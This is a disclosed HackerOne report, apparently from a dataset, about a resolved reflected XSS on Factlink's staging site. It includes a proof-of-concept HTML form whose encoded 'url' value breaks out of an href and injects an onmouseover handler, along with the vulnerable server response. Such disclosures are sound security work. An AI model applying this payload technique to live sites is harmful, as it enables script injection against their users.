---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '18805'
original_report_id: '18805'
title: XSS 01 on staging.fct.li
weakness: Cross-site Scripting (XSS) - Generic
team_handle: factlink
created_at: '2014-07-02T18:38:59.656Z'
disclosed_at: '2014-07-07T17:36:31.692Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS 01 on staging.fct.li

## Metadata

- HackerOne Report ID: 18805
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: factlink
- Disclosed At: 2014-07-07T17:36:31.692Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hey

the error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.


<html>
  <body>
    <form action="http://staging.fct.li/" method="POST">
      <input type="hidden" name="url" value="unana&apos;&#32;onmouseover&#61;alert&#40;1&#41;&#32;some&#61;&apos;na&#46;google&#46;de" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


The response is:
    HTTP/1.1 504 Gateway Time-out
    Server: nginx/1.4.4
    Date: Wed, 02 Jul 2014 18:13:51 GMT
    Content-Length: 215
    Connection: keep-alive

    This page is taking unusually long to load. You can try visiting the site without Factlink: <a href='http://unana' onmouseover=alert(1) some='na.google.de/'>http://unana' onmouseover=alert(1) some='na.google.de/</a>


Because of the "onmouseover" event waiting for its trigger you need to move your mouse over the link ...

cheers pUm

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
